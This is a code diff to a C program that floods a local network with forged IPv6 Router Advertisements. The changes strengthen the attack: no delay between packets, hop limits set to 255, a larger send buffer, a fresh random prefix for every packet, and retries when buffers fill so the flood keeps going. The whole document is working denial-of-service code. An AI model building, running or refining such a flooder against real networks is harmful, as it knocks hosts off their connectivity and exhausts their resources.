@@ -16,6 +16,7 @@
 #include <net/if.h>
 #include <arpa/inet.h>
 #include <time.h>
+#include <errno.h>
 
 // Data structures
 // ICMPv6 Router Advertisement Header (16 bytes total)
@@ -154,9 +155,7 @@ int main(int argc, char *argv[])
     
     int opt;
     char *interface = NULL;
-    uint8_t mac[6];
-    char prefix[INET6_ADDRSTRLEN];
-    int delay = 1;
+    int delay = 0;
     bool progress = false;
     bool fork_proc = false;
     pid_t pid;
@@ -190,29 +189,15 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    if(!lookup_mac(interface, mac))
-    {
-        printf("Could not find specified interface.\n");
-        return 1;
-    }
-
-    generate_random_prefix(prefix);
-
     Packet *p = malloc(sizeof(Packet));
-
     if(!p)
     {
         perror("malloc");
         return 1;
     }
 
-    if(!create_packet(p, mac, prefix))
-    {
-        return 1;
-    }
-
     enable_ipv6_forwarding(1);
-    printf("Flooding network, prefix: %s\n", prefix);
+    printf("Flooding network...\n");
     run_flood(p, delay, interface, progress);
     cleanup(p);
     return 0;
@@ -313,12 +298,26 @@ int create_packet(Packet *p, const uint8_t *mac, const char *prefix)
 
 int run_flood(Packet *p, int delay, const char *interface, bool progress)
 {
+    int hops = 255;
+    int bufzize = 1024 * 1024;
     int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
-
     if(sock < 0)
     {
         perror("socket");
         return 0;
+    }
+
+    setsockopt(sock, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &hops, sizeof(hops));
+    setsockopt(sock, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops, sizeof(hops));
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufzize, sizeof(bufzize));
+
+    char prefix[INET6_ADDRSTRLEN];
+    uint8_t mac[6];
+
+    if(!lookup_mac(interface, mac))
+    {
+        printf("Could not find specified interface.\n");
+        return 1;
     }
 
     struct sockaddr_in6 dest;
@@ -330,9 +329,21 @@ int run_flood(Packet *p, int delay, const char *interface, bool progress)
 
     while(keep_running)
     {
+        generate_random_prefix(prefix);
+
+        if(!create_packet(p, mac, prefix))
+        {
+            return 1;
+        }
+
         int bytes_sent = sendto(sock, p, sizeof(Packet), 0, (struct sockaddr *)&dest, sizeof(dest));
         if(bytes_sent < 0)
         {
+            if(errno == ENOBUFS)
+            {
+                usleep(50);
+                continue;
+            }
             perror("sendto");
             return 0;
         }
